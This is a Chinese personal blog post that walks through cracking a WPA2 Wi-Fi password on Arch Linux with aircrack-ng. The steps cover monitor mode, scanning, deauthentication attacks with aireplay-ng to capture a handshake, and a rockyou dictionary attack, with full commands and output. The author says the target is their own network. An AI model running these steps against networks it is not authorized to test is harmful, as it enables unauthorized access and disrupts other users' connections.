@@ -1,0 +1,168 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ScumTB"><meta name="copyright" content="ScumTB"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>Archlinux利用aircrack-ng暴力破解wifi | ScumTB's Site</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><script src="https://fastly.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer type="module"></script><script src="https://fastly.jsdelivr.net/npm/vue@2.6.14"></script><link rel="icon" type="image/svg+xml" href="/1.svg"><link rel="mask-icon" href="/1.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"scumtb.cn","root":"/","title":"ScumTB的小站","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn/?c=a","hitokoto":true},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js" defer></script><script src="/js/load-aplayer.js" defer></script><meta name="description" content="说明 本机为archlinux笔记本 网卡名wlp1s0  “wlp1s0”和”wlan0”都是Linux系统中用于表示无线网络接口的名称 curl -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。 大致步骤:网卡设为监听模式,扫描附近WIFI对其发起攻击，获取数据包,对包进行暴力破解  准备 无线网卡(笔记本自带||淘宝购买) WIFI字典curl -L -o roc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Archlinux利用aircrack-ng暴力破解wifi">
+<meta property="og:url" content="https://scumtb.cn/2023/04/29/aircrack-ng%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3wifi/index.html">
+<meta property="og:site_name" content="ScumTB&#39;s Site">
+<meta property="og:description" content="说明 本机为archlinux笔记本 网卡名wlp1s0  “wlp1s0”和”wlan0”都是Linux系统中用于表示无线网络接口的名称 curl -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。 大致步骤:网卡设为监听模式,扫描附近WIFI对其发起攻击，获取数据包,对包进行暴力破解  准备 无线网卡(笔记本自带||淘宝购买) WIFI字典curl -L -o roc">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-04-29T14:02:11.000Z">
+<meta property="article:modified_time" content="2023-05-01T08:07:30.529Z">
+<meta property="article:author" content="ScumTB">
+<meta name="twitter:card" content="summary"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="ScumTB"><img width="96" loading="lazy" src="/images/th.jpeg" alt="ScumTB"><span class="site-author-status" title="你鸡巴谁啊">😭</span></a><div class="site-author-name"><a href="/about/">ScumTB</a></div><span class="site-name">ScumTB's Site</span><sub class="site-subtitle">ScumTB</sub><div class="site-description">吃饭睡觉打豆豆</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">26</span></a></div><div class="site-state-item"><a href="/diary/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:edit-2-line"></span></span></a></div><div class="site-state-item"><a href="/tags/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:book-2-line"></span></span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://blog.scumtb.cn/about/" title="About"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.scumtb.cn" title="Home" target="_blank" style="color:#1296db"><span class="icon iconify" data-icon="ri:home-7-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/ScumTB" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=7800557453" title="Music" target="_blank" style="color:#C10D0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://steamcommunity.com/id/ScumTB" title="Steam" target="_blank" style="color:#004986"><span class="icon iconify" data-icon="ri:steam-fill"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/Scum33299664" title="Twitter" target="_blank" style="color:#1da1f2"><span class="icon iconify" data-icon="ri:twitter-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="girls" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a><a class="links-item hty-icon-button" href="/pixiv/" title="pixv" style="color:#0074AA"><span class="icon iconify" data-icon="ri:parking-line"></span></a><a class="links-item hty-icon-button" href="/albums/" title="albums" style="color:#d4237a"><span class="icon iconify" data-icon="ri:camera-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B4%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">3.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E7%BD%91%E5%8D%A1"><span class="toc-number">4.1.</span> <span class="toc-text">1. 查看网卡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%BD%91%E5%8D%A1%E8%AE%BE%E4%B8%BA%E7%9B%91%E5%90%AC%EF%BC%88monitor%EF%BC%89%E6%A8%A1%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">2. 网卡设为监听（monitor）模式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%89%AB%E6%8F%8F%E9%99%84%E8%BF%91%E7%9A%84wifi"><span class="toc-number">4.3.</span> <span class="toc-text">3. 扫描附近的wifi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%8A%93%E5%8C%85%E5%87%86%E5%A4%87%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.</span> <span class="toc-text">4. 抓包准备攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E7%94%A8%E5%AD%97%E5%85%B8%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.5.</span> <span class="toc-text">5. 用字典进行暴力破解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">5.</span> <span class="toc-text">注意</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://scumtb.cn/2023/04/29/aircrack-ng%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3wifi/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ScumTB"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ScumTB's Site"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Archlinux利用aircrack-ng暴力破解wifi</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2023-04-29 22:02:11" itemprop="dateCreated datePublished" datetime="2023-04-29T22:02:11+08:00">2023-04-29</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2023-05-01 16:07:30" itemprop="dateModified" datetime="2023-05-01T16:07:30+08:00">2023-05-01</time></div><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><ul>
+<li>本机为archlinux笔记本</li>
+<li>网卡名wlp1s0 </li>
+<li>“wlp1s0”和”wlan0”都是Linux系统中用于表示无线网络接口的名称</li>
+<li>curl -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</li>
+<li>大致步骤:网卡设为监听模式,扫描附近WIFI对其发起攻击，获取数据包,对包进行暴力破解</li>
+</ul>
+<h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ol>
+<li>无线网卡(笔记本自带||淘宝购买)</li>
+<li>WIFI字典<code>curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></li>
+</ol>
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul>
+<li>sudo pacman -S aircrack-ng</li>
+</ul>
+<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><h5 id="1-查看网卡"><a href="#1-查看网卡" class="headerlink" title="1. 查看网卡"></a>1. 查看网卡</h5><pre class="language-none"><code class="language-none">iwconfig</code></pre>
+<pre class="language-none"><code class="language-none">lo        no wireless extensions.
+wlp1s0    IEEE 802.11  ESSID:&quot;i-wxxy&quot;
+          Mode:Managed  Frequency:5.805 GHz  Access Point: 98:35:ED:40:BE:10
+          Bit Rate&#x3D;192.7 Mb&#x2F;s   Tx-Power&#x3D;20 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          Link Quality&#x3D;65&#x2F;70  Signal level&#x3D;-45 dBm
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:145   Missed beacon:0
+docker0   no wireless extensions.
+br-a74bdffadf65  no wireless extensions.
+vethbbcf498  no wireless extensions.</code></pre>
+<h5 id="2-网卡设为监听（monitor）模式"><a href="#2-网卡设为监听（monitor）模式" class="headerlink" title="2. 网卡设为监听（monitor）模式"></a>2. 网卡设为监听（monitor）模式</h5><pre class="language-none"><code class="language-none">sudo airmon-ng start wlp1s0</code></pre>
+<pre class="language-none"><code class="language-none">Found 2 processes that could cause trouble.
+Kill them using &#39;airmon-ng check kill&#39; before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    492 NetworkManager
+    544 wpa_supplicant
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp1s0		rtw_8822ce	Realtek Semiconductor Co., Ltd. RTL8822CE 802.11ac PCIe Wireless Network Adapter
+		(monitor mode enabled)</code></pre>
+<ul>
+<li>确保你是断网(上面进程我没杀掉，确保自己没连网就可以)</li>
+<li><code>iwconfig</code>mode为<code>monitor</code><pre class="language-none"><code class="language-none">lo        no wireless extensions.
+
+wlp1s0    IEEE 802.11  Mode:Monitor  Frequency:2.417 GHz  Tx-Power&#x3D;20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on</code></pre></li>
+</ul>
+<h5 id="3-扫描附近的wifi"><a href="#3-扫描附近的wifi" class="headerlink" title="3. 扫描附近的wifi"></a>3. 扫描附近的wifi</h5><pre class="language-none"><code class="language-none">sudo airodump-ng wlp1s0</code></pre>
+<p>我的结果，我需要破解的是ESSID为ScumTB</p>
+<pre class="language-none"><code class="language-none">CH  3 ][ Elapsed: 6 s ][ 2023-04-29 22:58 
+
+ BSSID              PWR  Beacons    #Data, #&#x2F;s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 9E:7F:81:09:32:AC   -1        0        3    0   1   -1   WPA              &lt;length:  0&gt;                                                                       
+ 04:BD:70:53:07:60  -83        4        0    0   6  360   OPN              i-wxxy                                                                             
+ 3C:CD:57:9A:FE:7D  -78        3        0    0   5  130   WPA2 CCMP   PSK  ZNMS                                                                               
+ 00:1E:73:6E:64:5C  -96        2        0    0  13  270   WPA2 CCMP   PSK  SR5D_645c                                                                          
+ C2:B1:76:EF:A6:20  -76        4        0    0   6  360   WPA2 CCMP   PSK  iQOO Neo5                                                                          
+ 30:C5:0F:47:FB:20  -87        2        0    0   6  360   OPN              i-wxxy                                                                             
+ 0A:54:7B:58:90:38  -31       11        0    0   6  130   WPA2 CCMP   PSK  ScumTB                                                                             
+ 98:35:ED:40:BE:00  -50        0        0    0   1  130   OPN              i-wxxy                                                                             
+ 3C:67:A5:00:2B:AC  -86        4        0    0   1  270   WPA2 CCMP   PSK  MIFI_2BAC                                                                          
+ 3C:CD:57:9A:FF:87  -93        2        0    0   1  130   WPA2 CCMP   PSK  ZNMS                                                                               
+ 3C:CD:57:AE:BD:60  -88        6        0    0  11  130   WPA2 CCMP   PSK  ZNMS                                                                               
+ 98:35:ED:40:B9:00  -91        5        0    0  11  130   OPN              i-wxxy                                                                             
+ 98:35:ED:40:C9:E0  -58        9        0    0  11  130   OPN              i-wxxy </code></pre>
+
+<ul>
+<li>如果是wlan网卡设备名会变成<code>wlan0mon</code>用<code>wlan0mon</code>替代<code>wlp1s0</code></li>
+<li>记录要破解的wifi的ESSID BSSID CH</li>
+</ul>
+<h5 id="4-抓包准备攻击"><a href="#4-抓包准备攻击" class="headerlink" title="4. 抓包准备攻击"></a>4. 抓包准备攻击</h5><p>尝试抓取</p>
+<pre class="language-none"><code class="language-none">sudo airodump-ng wlp1s0 --bssid 0A:54:7B:58:90:38 -c 6</code></pre>
+<p>结果如下</p>
+<pre class="language-none"><code class="language-none">CH  6 ][ Elapsed: 1 min ][ 2023-04-29 23:04 
+BSSID              PWR RXQ  Beacons    #Data, #&#x2F;s  CH   MB   ENC CIPHER  AUTH ESSID
+0A:54:7B:58:90:38  -38 100      801       16    0   6  130   WPA2 CCMP   PSK  ScumTB                                                                         
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+0A:54:7B:58:90:38  A2:D7:C7:F2:4D:3F  -35   24e- 6      0       23      </code></pre>
+<p>记录BSSID：wifi ;  STATION:设备 </p>
+<pre class="language-none"><code class="language-none">0A:54:7B:58:90:38  A2:D7:C7:F2:4D:3F</code></pre>
+<p>开始抓包并记录</p>
+<pre class="language-none"><code class="language-none">sudo airodump-ng wlp1s0 --bssid 0A:54:7B:58:90:38 -c 6 -w ScumTB</code></pre>
+<p>打开新的终端进行断网攻击</p>
+<pre class="language-none"><code class="language-none">sudo aireplay-ng wlp1s0 -0 10 -a 0A:54:7B:58:90:38 -c A2:D7:C7:F2:4D:3F</code></pre>
+<p>多试几次，每次结束稍微停留一会，等目标连接wifi成功，这样就抓取到数据</p>
+<pre class="language-none"><code class="language-none">CH  6 ][ Elapsed: 18 s ][ 2023-04-29 23:22 ][ WPA handshake: A2:FC:3F:39:3E:E0 
+ BSSID              PWR RXQ  Beacons    #Data, #&#x2F;s  CH   MB   ENC CIPHER  AUTH ESSID
+ A2:FC:3F:39:3E:E0  -41 100      194      179    0   6  130   WPA2 CCMP   PSK  ScumTB                                                                         
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+ A2:FC:3F:39:3E:E0  A2:D7:C7:F2:4D:3F  -34   24e- 6      0      208  EAPOL  ScumTB      </code></pre>
+<h5 id="5-用字典进行暴力破解"><a href="#5-用字典进行暴力破解" class="headerlink" title="5. 用字典进行暴力破解"></a>5. 用字典进行暴力破解</h5><pre class="language-none"><code class="language-none">sudo aircrack-ng ScumTB-01.cap -w ~&#x2F;Documents&#x2F;rockyou.txt</code></pre>
+<p> .cap是抓取到的数据 -w是下载的字典</p>
+<pre class="language-none"><code class="language-none">                         Aircrack-ng 1.7 
+[00:00:00] 26&#x2F;10303727 keys tested (295.04 k&#x2F;s) 
+Time left: 9 hours, 42 minutes, 3 seconds                  0.00%
+                     KEY FOUND! [ 123456789 ]
+Master Key     : 0C 8D 75 1C B1 BC 0D 2A 76 E9 CC 27 33 43 76 87 
+                 B0 D2 8F E5 3D B3 08 1F C0 F4 D6 76 7F 29 D8 51 
+Transient Key  : 29 C0 E1 26 7D CF 97 46 82 A8 9A 2A B4 1F E5 37 
+                 33 AE D1 91 4D FB FF C8 62 16 A0 5E AF 99 41 1A 
+                 59 1C 27 DD 31 24 38 96 45 27 93 2F 37 69 75 07 
+                 7B 04 A4 A4 70 B6 2F 00 89 29 8E 49 91 46 4F 5B 
+EAPOL HMAC     : 57 0B 81 23 6B 4F 52 FA 53 4E 26 20 82 02 B1 15 </code></pre>
+<p>我的密码简单，很容易破解</p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
+<li>暴力破解，如果字典没有匹配的密码是不能成功的</li>
+<li>确保你是断网(网卡为monitor) </li>
+<li>目标用户在使用该网络，并在攻击后会尝试连接，否则不能抓取到数据包</li>
+</ul>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/brannondorsey/wifi-cracking">https://github.com/brannondorsey/wifi-cracking</a></p>
+</blockquote>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>ScumTB</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://scumtb.cn/2023/04/29/aircrack-ng%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3wifi/" title="Archlinux利用aircrack-ng暴力破解wifi">https://scumtb.cn/2023/04/29/aircrack-ng%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3wifi/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2023/05/03/%E4%BA%94%E4%B8%80%E8%8F%9C%E8%B0%B1%EF%BC%9A%E8%B1%86%E8%8A%BD%E7%82%92%E8%82%89/" rel="prev" title="五一菜谱：豆芽炒肉"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">五一菜谱：豆芽炒肉</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2023/04/24/Hexo%E5%A4%9A%E5%8F%B0%E7%94%B5%E8%84%91%E5%90%8C%E6%AD%A5/" rel="next" title="Hexo多台电脑同步"><span class="post-nav-text">Hexo多台电脑同步</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ScumTB</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v6.3.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-10-29T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = ` ${passDay} Days ${passHour} Hours ${passMinute} Minutes ${passSecond} Seconds`;
+}
+blog_live_time();
+</script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>
